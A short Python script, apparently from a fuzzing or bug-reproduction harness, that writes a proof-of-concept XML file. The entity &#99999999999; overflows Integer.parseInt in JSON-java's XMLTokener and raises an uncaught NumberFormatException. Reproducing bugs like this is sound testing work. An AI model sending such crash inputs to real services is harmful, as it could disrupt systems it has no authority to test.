#!/usr/bin/env python3
"""Generate PoC for jsonjava-unescape-numformat.

XMLTokener.unescapeEntity() parses XML numeric character references
&#NNNN; via Integer.parseInt(). When the digit run overflows int range,
NumberFormatException propagates uncaught past the harness boundary.

A safe PoC: a decimal NCR with more digits than int can hold.
"""

def create_poc(output='poc.bin'):
    # `&#99999999999;` -> Integer.parseInt overflows -> NumberFormatException
    blob = b'<a>&#99999999999;</a>'
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
